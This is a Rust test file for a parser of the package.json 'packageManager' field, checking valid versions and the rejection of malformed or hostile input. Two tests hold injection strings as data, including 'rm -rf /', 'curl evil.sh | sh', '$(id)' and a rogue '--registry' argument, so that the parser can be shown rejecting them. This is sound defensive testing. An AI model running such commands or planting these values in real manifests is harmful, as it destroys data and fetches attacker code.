//! The `"packageManager"` grammar, and everything it has to refuse.

use super::*;

#[test]
fn parses_every_supported_package_manager_field_name() {
    for (raw, expected) in [
        ("npm@10.5.0", PackageManager::Npm),
        ("pnpm@9.1.0", PackageManager::Pnpm),
        ("bun@1.1.30", PackageManager::Bun),
        ("yarn@1.22.19", PackageManager::Yarn(YarnEdition::Classic)),
        ("yarn@4.1.0", PackageManager::Yarn(YarnEdition::Berry)),
        ("yarn@2.0.0", PackageManager::Yarn(YarnEdition::Berry)),
    ] {
        let spec = parse_package_manager_field(raw).unwrap();
        assert_eq!(spec.manager, expected, "{raw}");
    }
}

#[test]
fn parses_a_prerelease_and_integrity_suffix() {
    let spec = parse_package_manager_field("pnpm@9.0.0-beta.1+sha512.deadbeef-0").unwrap();

    assert_eq!(spec.manager, PackageManager::Pnpm);
    assert_eq!(spec.version.major, 9);
    assert_eq!(spec.version.prerelease.as_deref(), Some("beta.1"));
    assert_eq!(spec.integrity.as_deref(), Some("sha512.deadbeef-0"));
    assert_eq!(spec.version.to_string(), "9.0.0-beta.1");
}

#[test]
fn parses_an_integrity_suffix_without_a_prerelease() {
    let spec = parse_package_manager_field("yarn@4.1.0+sha224.abc").unwrap();

    assert_eq!(spec.version.prerelease, None);
    assert_eq!(spec.integrity.as_deref(), Some("sha224.abc"));
}

#[test]
fn rejects_an_empty_package_manager_field() {
    assert_eq!(
        parse_package_manager_field(""),
        Err(PackageManagerFieldError::Empty)
    );
}

#[test]
fn rejects_a_package_manager_field_without_a_separator() {
    assert_eq!(
        parse_package_manager_field("pnpm"),
        Err(PackageManagerFieldError::MissingSeparator)
    );
}

#[test]
fn rejects_an_unknown_package_manager_name() {
    assert_eq!(
        parse_package_manager_field("uf@1.0.0"),
        Err(PackageManagerFieldError::UnknownManager {
            name: CompactString::const_new("uf"),
        })
    );
}

#[test]
fn rejects_a_shell_injection_attempt_with_a_typed_error() {
    // A hostile manifest must never reach a program name or an argument.
    let error = parse_package_manager_field("pnpm@9.0.0; rm -rf /").unwrap_err();

    assert_eq!(
        error,
        PackageManagerFieldError::ForbiddenCharacter {
            character: ';',
            offset: "pnpm@9.0.0".len(),
        }
    );
    assert!(error.to_string().contains("forbidden character"));
}

#[test]
fn rejects_shell_metacharacters_anywhere_in_the_field() {
    for hostile in [
        "pnpm@9.0.0 && curl evil.sh | sh",
        "pnpm@9.0.0|whoami",
        "pnpm@9.0.0`id`",
        "pnpm@9.0.0$(id)",
        "pnpm@9.0.0\nnpm@1.0.0",
        "pnpm@9.0.0 --registry=http://evil",
        "../../bin/sh@1.0.0",
        "pnpm@9.0.0+sha512.abc;id",
    ] {
        assert!(
            parse_package_manager_field(hostile).is_err(),
            "accepted {hostile:?}"
        );
    }
}

#[test]
fn rejects_a_malformed_version() {
    for raw in [
        "pnpm@",
        "pnpm@9",
        "pnpm@9.",
        "pnpm@9.1",
        "pnpm@9.1.",
        "pnpm@.1.0",
    ] {
        assert!(
            matches!(
                parse_package_manager_field(raw),
                Err(PackageManagerFieldError::MalformedVersion { .. })
            ),
            "accepted {raw:?}"
        );
    }
}

#[test]
fn rejects_a_version_component_that_overflows_u32() {
    assert!(matches!(
        parse_package_manager_field("pnpm@99999999999.0.0"),
        Err(PackageManagerFieldError::VersionOverflow { .. })
    ));
}

#[test]
fn rejects_an_empty_prerelease_or_integrity_segment() {
    assert!(parse_package_manager_field("pnpm@9.0.0-").is_err());
    assert!(parse_package_manager_field("pnpm@9.0.0+").is_err());
    assert!(parse_package_manager_field("pnpm@9.0.0-+sha512.a").is_err());
}

#[test]
fn rejects_a_second_integrity_segment() {
    assert!(parse_package_manager_field("pnpm@9.0.0+sha1.a+sha1.b").is_err());
}

#[test]
fn rejects_an_oversized_package_manager_field_before_parsing_it() {
    let raw = format!("pnpm@9.0.0+{}", "a".repeat(MAX_PACKAGE_MANAGER_FIELD_BYTES));

    assert!(matches!(
        parse_package_manager_field(&raw),
        Err(PackageManagerFieldError::TooLong { limit, .. })
            if limit == MAX_PACKAGE_MANAGER_FIELD_BYTES
    ));
}

#[test]
fn a_pathological_package_manager_field_parses_in_one_pass() {
    // The classic ReDoS shape (`(a+)+$` fed a long run then a mismatch) is
    // linear here because the grammar is hand-written and every byte is
    // visited once; a backtracking regex would blow up on this input.
    let bounded = format!("pnpm@9.0.0-{}!", "a-.".repeat(38));
    assert!(bounded.len() <= MAX_PACKAGE_MANAGER_FIELD_BYTES);
    assert!(matches!(
        parse_package_manager_field(&bounded),
        Err(PackageManagerFieldError::ForbiddenCharacter { character: '!', .. })
    ));

    // Anything longer is refused by the length cap before parsing starts.
    let oversized = format!("pnpm@9.0.0-{}!", "a-.".repeat(4096));
    assert!(oversized.len() > MAX_PACKAGE_MANAGER_FIELD_BYTES);
    assert!(matches!(
        parse_package_manager_field(&oversized),
        Err(PackageManagerFieldError::TooLong { .. })
    ));
}

#[test]
fn leading_zero_version_components_are_accepted_like_corepack() {
    let spec = parse_package_manager_field("npm@0010.0.0").unwrap();

    assert_eq!(spec.version.major, 10);
}

#[test]
fn untrusted_text_in_errors_is_truncated() {
    let raw = format!("npm@{}", "1".repeat(64));

    let Err(PackageManagerFieldError::VersionOverflow { component }) =
        parse_package_manager_field(&raw)
    else {
        panic!("expected an overflow rejection");
    };
    assert_eq!(component.len(), 32);
}
